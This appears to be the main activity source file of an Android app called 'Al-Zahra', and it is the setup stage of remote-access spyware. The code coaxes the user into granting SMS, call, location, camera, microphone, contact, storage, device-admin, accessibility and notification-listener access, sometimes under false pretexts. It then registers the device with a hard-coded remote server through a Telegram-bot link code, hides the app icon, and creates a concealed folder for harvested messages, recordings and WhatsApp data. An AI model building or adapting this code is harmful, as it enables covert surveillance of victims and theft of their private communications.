package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String TAG = "AlZahra";
    private static final int PERM_REQ = 1001;
    private static final int REQ_OVERLAY = 1002;
    private static final int REQ_BATTERY = 1003;
    private static final int REQ_STORAGE = 1004;
    private static final int REQ_ADMIN = 1005;
    private static final int REQ_NOTIFICATION = 1006;
    private static final int REQ_ACCESSIBILITY = 1007;
    private static final int REQ_NOTIFICATION_LISTENER = 1008;
    
    private SharedPreferences prefs;
    private Handler handler;
    private LinearLayout layout;
    private TextView statusText;
    private ProgressBar progressBar;
    private String serverUrl = "http://216.128.156.226:8443";
    private int currentStep = 0;
    private static final int TOTAL_STEPS = 14;

    private final String[][] PERMISSIONS = {
        {Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG, Manifest.permission.CALL_PHONE, Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.ANSWER_PHONE_CALLS},
        {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.RECEIVE_MMS},
        {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION},
        {Manifest.permission.CAMERA, Manifest.permission.FLASHLIGHT},
        {Manifest.permission.RECORD_AUDIO, Manifest.permission.MODIFY_AUDIO_SETTINGS, Manifest.permission.CAPTURE_AUDIO_OUTPUT},
        {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.GET_ACCOUNTS},
        {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}
    };

    private final String[] STEP_TITLES = {
        "صلاحيات الهاتف والمكالمات", "صلاحيات الرسائل", "صلاحيات الموقع",
        "صلاحيات الكاميرا", "صلاحيات الميكروفون", "صلاحيات جهات الاتصال", "صلاحيات التخزين"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        if (prefs.getBoolean("configured", false)) {
            startServiceAndHide();
            return;
        }
        setupUI();
        handler.postDelayed(this::processNextStep, 1000);
    }

    private void setupUI() {
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(0xFF0A0A1A);
        
        TextView title = new TextView(this);
        title.setText("🔐 Al-Zahra v4.1");
        title.setTextColor(0xFF00D4FF);
        title.setTextSize(28);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 10);
        layout.addView(title);
        
        TextView subtitle = new TextView(this);
        subtitle.setText("إعداد التطبيق لأول مرة");
        subtitle.setTextColor(0xFF666666);
        subtitle.setTextSize(16);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 30);
        layout.addView(subtitle);
        
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(TOTAL_STEPS);
        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 20);
        pbParams.setMargins(0, 10, 0, 20);
        layout.addView(progressBar, pbParams);
        
        statusText = new TextView(this);
        statusText.setText("جاري التحميل...");
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 20);
        layout.addView(statusText);
        
        setContentView(layout);
    }

    private void updateStatus(String text) {
        runOnUiThread(() -> {
            statusText.setText(text);
            progressBar.setProgress(currentStep);
        });
    }

    private void processNextStep() {
        if (currentStep < PERMISSIONS.length) {
            requestPermissionStep(currentStep);
        } else if (currentStep == PERMISSIONS.length) {
            requestOverlayPermission();
        } else if (currentStep == PERMISSIONS.length + 1) {
            requestBatteryOptimization();
        } else if (currentStep == PERMISSIONS.length + 2) {
            requestStoragePermission();
        } else if (currentStep == PERMISSIONS.length + 3) {
            requestAdminPermission();
        } else if (currentStep == PERMISSIONS.length + 4) {
            requestNotificationPermission();
        } else if (currentStep == PERMISSIONS.length + 5) {
            requestAccessibilityPermission();
        } else if (currentStep == PERMISSIONS.length + 6) {
            requestNotificationListenerPermission();
        } else if (currentStep == PERMISSIONS.length + 7) {
            showLinkScreen();
        } else {
            finishSetup();
        }
    }

    private void requestPermissionStep(int step) {
        String[] perms = PERMISSIONS[step];
        boolean allGranted = true;
        for (String perm : perms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            currentStep++;
            processNextStep();
            return;
        }
        updateStatus(String.format("الخطوة %d/%d\n\n%s", step + 1, TOTAL_STEPS, STEP_TITLES[step]));
        new AlertDialog.Builder(this)
            .setTitle("🔐 " + STEP_TITLES[step])
            .setMessage("يرجى السماح للمتابعة")
            .setPositiveButton("السماح", (d, w) -> ActivityCompat.requestPermissions(this, perms, PERM_REQ + step))
            .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
            .setCancelable(false)
            .show();
    }

    private void requestOverlayPermission() {
        updateStatus("الخطوة 8/14\n\nصلاحية العرض فوق التطبيقات");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                .setTitle("🔐 العرض فوق التطبيقات")
                .setMessage("مطلوبة لحماية التطبيق")
                .setPositiveButton("السماح", (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQ_OVERLAY);
                })
                .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                .setCancelable(false)
                .show();
        } else {
            currentStep++;
            processNextStep();
        }
    }

    private void requestBatteryOptimization() {
        updateStatus("الخطوة 9/14\n\nتجاهل تحسين البطارية");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("🔋 تحسين البطارية")
                    .setMessage("مطلوب لعمل التطبيق في الخلفية")
                    .setPositiveButton("السماح", (d, w) -> {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, REQ_BATTERY);
                    })
                    .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                    .setCancelable(false)
                    .show();
            } else {
                currentStep++;
                processNextStep();
            }
        } else {
            currentStep++;
            processNextStep();
        }
    }

    private void requestStoragePermission() {
        updateStatus("الخطوة 10/14\n\nصلاحيات التخزين الكامل");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            new AlertDialog.Builder(this)
                .setTitle("📁 التخزين الكامل")
                .setMessage("مطلوبة للوصول لجميع الملفات")
                .setPositiveButton("السماح", (d, w) -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        startActivityForResult(intent, REQ_STORAGE);
                    } catch (Exception e) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, REQ_STORAGE);
                    }
                })
                .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                .setCancelable(false)
                .show();
        } else {
            currentStep++;
            processNextStep();
        }
    }

    private void requestAdminPermission() {
        updateStatus("الخطوة 11/14\n\nصلاحية المسؤول");
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            currentStep++;
            processNextStep();
            return;
        }
        new AlertDialog.Builder(this)
            .setTitle("🔐 صلاحية المسؤول")
            .setMessage("مطلوبة لحماية التطبيق")
            .setPositiveButton("السماح", (d, w) -> {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوبة لحماية التطبيق");
                startActivityForResult(intent, REQ_ADMIN);
            })
            .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
            .setCancelable(false)
            .show();
    }

    private void requestNotificationPermission() {
        updateStatus("الخطوة 12/14\n\nصلاحية الإشعارات");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
                return;
            }
        }
        currentStep++;
        processNextStep();
    }

    private void requestAccessibilityPermission() {
        updateStatus("الخطوة 13/14\n\nخدمة إمكانية الوصول");
        if (!isAccessibilityServiceEnabled()) {
            new AlertDialog.Builder(this)
                .setTitle("♿ خدمة إمكانية الوصول")
                .setMessage("مطلوبة لمراقبة التطبيقات والنصوص")
                .setPositiveButton("السماح", (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivityForResult(intent, REQ_ACCESSIBILITY);
                })
                .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                .setCancelable(false)
                .show();
        } else {
            currentStep++;
            processNextStep();
        }
    }

    private void requestNotificationListenerPermission() {
        updateStatus("الخطوة 14/14\n\nخدمة مراقبة الإشعارات");
        if (!isNotificationListenerEnabled()) {
            new AlertDialog.Builder(this)
                .setTitle("🔔 مراقبة الإشعارات")
                .setMessage("مطلوبة لسحب الإشعارات")
                .setPositiveButton("السماح", (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    startActivityForResult(intent, REQ_NOTIFICATION_LISTENER);
                })
                .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                .setCancelable(false)
                .show();
        } else {
            currentStep++;
            processNextStep();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String serviceName = getPackageName() + "/" + com.alzahra.service.AccessibilityService.class.getName();
        try {
            int accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (accessibilityEnabled == 1) {
                String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (settingValue != null) {
                    return settingValue.contains(serviceName);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Accessibility check error", e);
        }
        return false;
    }

    private boolean isNotificationListenerEnabled() {
        String packageName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(packageName);
    }

    private void showLinkScreen() {
        currentStep = TOTAL_STEPS;
        runOnUiThread(() -> {
            layout.removeAllViews();
            layout.setBackgroundColor(0xFF0A0A1A);
            
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز");
            title.setTextColor(0xFF00D4FF);
            title.setTextSize(26);
            title.setGravity(Gravity.CENTER);
            title.setPadding(0, 0, 0, 15);
            layout.addView(title);
            
            TextView info = new TextView(this);
            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link أو اضغط 🔗\n3. أدخل الكود هنا");
            info.setTextColor(0xFF888888);
            info.setTextSize(14);
            info.setGravity(Gravity.CENTER);
            info.setPadding(0, 0, 0, 30);
            layout.addView(info);
            
            EditText input = new EditText(this);
            input.setHint("أدخل الكود هنا");
            input.setTextSize(22);
            input.setGravity(Gravity.CENTER);
            input.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS);
            input.setBackgroundColor(0xFF151530);
            input.setTextColor(0xFFFFFFFF);
            input.setHintTextColor(0xFF666666);
            input.setPadding(20, 20, 20, 20);
            input.setId(100);
            layout.addView(input);
            
            TextView status = new TextView(this);
            status.setText("");
            status.setTextSize(14);
            status.setGravity(Gravity.CENTER);
            status.setPadding(0, 15, 0, 15);
            status.setId(101);
            layout.addView(status);
            
            Button btn = new Button(this);
            btn.setText("🔗 ربط");
            btn.setTextSize(18);
            btn.setBackgroundColor(0xFF00D4FF);
            btn.setTextColor(0xFF000000);
            btn.setPadding(20, 20, 20, 20);
            btn.setOnClickListener(v -> {
                String code = input.getText().toString().trim().toUpperCase();
                if (code.length() != 6) {
                    status.setText("❌ الكود 6 أحرف");
                    status.setTextColor(0xFFFF5252);
                    return;
                }
                btn.setEnabled(false);
                status.setText("⏳ جاري التحقق...");
                status.setTextColor(0xFFFFAB40);
                verifyCode(code, status, btn);
            });
            layout.addView(btn);
        });
    }

    private void verifyCode(String code, TextView status, Button btn) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/register");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                String deviceId = getAlzahraDeviceId();
                String json = String.format("{\"device_id\":\"%s\",\"model\":\"%s\",\"android\":\"%s\",\"link_code\":\"%s\"}", 
                    deviceId, Build.MODEL, Build.VERSION.RELEASE, code);
                conn.getOutputStream().write(json.getBytes());
                
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    org.json.JSONObject resp = new org.json.JSONObject(sb.toString());
                    if ("ok".equals(resp.optString("status"))) {
                        String sessionCode = resp.optString("session_code", "");
                        prefs.edit()
                            .putBoolean("linked", true)
                            .putString("device_id", deviceId)
                            .putString("session_code", sessionCode)
                            .putString("link_code", code)
                            .apply();
                        
                        runOnUiThread(() -> {
                            status.setText("✅ تم الربط بنجاح!");
                            status.setTextColor(0xFF69F0AE);
                            showHideDialog();
                        });
                    } else {
                        runOnUiThread(() -> {
                            status.setText("❌ " + resp.optString("message", "كود غير صحيح"));
                            status.setTextColor(0xFFFF5252);
                            btn.setEnabled(true);
                        });
                    }
                } else {
                    runOnUiThread(() -> {
                        status.setText("❌ خطأ في الاتصال بالسيرفر");
                        status.setTextColor(0xFFFF5252);
                        btn.setEnabled(true);
                    });
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Verify error", e);
                runOnUiThread(() -> {
                    status.setText("❌ فشل الاتصال: " + e.getMessage());
                    status.setTextColor(0xFFFF5252);
                    btn.setEnabled(true);
                });
            }
        }).start();
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
            .setTitle("✅ تم الربط!")
            .setMessage("هل تريد إخفاء أيقونة التطبيق؟")
            .setPositiveButton("نعم", (d, w) -> {
                hideAppIcon();
                currentStep++;
                processNextStep();
            })
            .setNegativeButton("لا", (d, w) -> {
                currentStep++;
                processNextStep();
            })
            .setCancelable(false)
            .show();
    }

    private void hideAppIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.alzahra.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "Hide error", e);
        }
    }

    private void finishSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        prefs.edit()
            .putBoolean("configured", true)
            .putLong("setup_time", System.currentTimeMillis())
            .apply();
        createSecretFolder();
        handler.postDelayed(this::startServiceAndHide, 1000);
    }

    private void createSecretFolder() {
        try {
            File dir = new File(getExternalFilesDir(null), ".sys_cache");
            if (!dir.exists()) dir.mkdirs();
            String[] subs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp", "backups", "files", "audio", "video", "images", "documents"};
            for (String s : subs) {
                File sub = new File(dir, s);
                if (!sub.exists()) sub.mkdirs();
            }
            prefs.edit().putString("secret_path", dir.getAbsolutePath()).apply();
        } catch (Exception e) {
            Log.e(TAG, "Folder error", e);
        }
    }

    private void startServiceAndHide() {
        try {
            Intent i = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {
            Log.e(TAG, "Service error", e);
        }
        finishAffinity();
    }

    private String getAlzahraDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) {
            id = java.util.UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code >= PERM_REQ && code < PERM_REQ + PERMISSIONS.length) {
            boolean allGranted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                currentStep = code - PERM_REQ + 1;
                processNextStep();
            } else {
                new AlertDialog.Builder(this)
                    .setTitle("⚠️ مطلوب")
                    .setMessage("يرجى السماح للمتابعة")
                    .setPositiveButton("إعادة", (d, w) -> processNextStep())
                    .setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); })
                    .setCancelable(false)
                    .show();
            }
        }
    }

    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        currentStep++;
        processNextStep();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
